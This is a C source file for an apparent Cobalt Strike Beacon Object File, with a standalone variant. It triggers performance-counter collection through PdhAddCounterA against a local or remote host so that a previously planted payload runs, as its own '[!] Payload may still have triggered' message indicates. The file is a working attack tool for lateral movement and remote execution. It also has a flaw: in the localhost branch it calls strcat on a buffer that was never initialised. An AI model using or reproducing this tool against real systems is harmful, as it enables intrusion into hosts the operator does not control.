#include <windows.h>
#include <pdh.h>
#include <pdhmsg.h>
#include "perf-trigger.h"

#ifdef BOF
#include "beacon.h"
#else
#include <stdio.h>
#endif

#include "common.c"

#define BUF_SIZE 512

void execute(char* target, char* object, char* counter) {
    internal_printf("[*] Target: %s\n", target);
    internal_printf("[*] Object: %s\n", object);
    internal_printf("[*] Counter: %s\n\n", counter);

    /* Set the PDH CounterPath */
    char* pathHead = "\\\\";
    char* pathSeparator = "\\";
    char* pathTail = "\x00";

    char* fullPath;

    if (MSVCRT$strcmp(target, "localhost") == 0) {
        fullPath = MSVCRT$malloc(MSVCRT$strlen(pathSeparator) +  MSVCRT$strlen(object) + MSVCRT$strlen(pathSeparator) + MSVCRT$strlen(counter) + MSVCRT$strlen(pathTail) + 1);
    }
    else {
        fullPath = MSVCRT$malloc(MSVCRT$strlen(pathHead) + MSVCRT$strlen(target) + MSVCRT$strlen(pathSeparator) +  MSVCRT$strlen(object) + MSVCRT$strlen(pathSeparator) + MSVCRT$strlen(counter) + MSVCRT$strlen(pathTail) + 1);
        MSVCRT$strcpy(fullPath, pathHead);
	    MSVCRT$strcat(fullPath, target);
    }

	MSVCRT$strcat(fullPath, pathSeparator);
    MSVCRT$strcat(fullPath, object);
    MSVCRT$strcat(fullPath, pathSeparator);
    MSVCRT$strcat(fullPath, counter);
    MSVCRT$strcat(fullPath, pathTail);

    /* Trigger Performance Data Collection */
    PDH_HQUERY hQuery;
    PDH_HCOUNTER hCounter;

    PDH_STATUS status = PDH$PdhOpenQuery(NULL, NULL, &hQuery);
    if (status != ERROR_SUCCESS) {
        internal_printf("[!] PdhOpenQuery failed with error code: %d\n", status);
        MSVCRT$free(fullPath);
        return;
    }

    status = PDH$PdhAddCounterA(hQuery, fullPath, 0, &hCounter);
    if (status != ERROR_SUCCESS) {
        internal_printf("[!] PdhAddCounterA failed with error code: %d\n", status);
        internal_printf("[!] Payload may still have triggered\n");
        PDH$PdhCloseQuery(hQuery);
        MSVCRT$free(fullPath);
        return;
    }

    internal_printf("[+] PdhAddCounterA call successful\n");
    
    PDH$PdhCloseQuery(hQuery);
    MSVCRT$free(fullPath);
    return;
}

#ifdef BOF
void go(IN PCHAR Args, IN ULONG Length) {
	char* target = NULL;
    char* object = NULL;
    char* counter = NULL;
	
	datap parser;
	BeaconDataParse(&parser, Args, Length);
    object = (char*)BeaconDataExtract(&parser, NULL);
    counter = (char*)BeaconDataExtract(&parser, NULL);
    target = (char*)BeaconDataExtract(&parser, NULL);
    
    if(!bofstart())
	{
		return;
	}

	execute(target, object, counter);
    printoutput(TRUE);
	return;
}

#else

int main(int argc, char* argv[]) {
    if (argc < 3) {
		internal_printf("[!] Missing arguments\n");
        internal_printf("[!] Usage: %s <object> <counter> <optional: target>\n", argv[0]);
		return 0;
	}

	
    char* category = argv[1];
    char* counter = argv[2];
    char* target;

    if (argc == 3){
        target = "localhost";
    }
    else {
        target = argv[3];
    }
    
    execute(target, category, counter);
    return 0;
}

#endif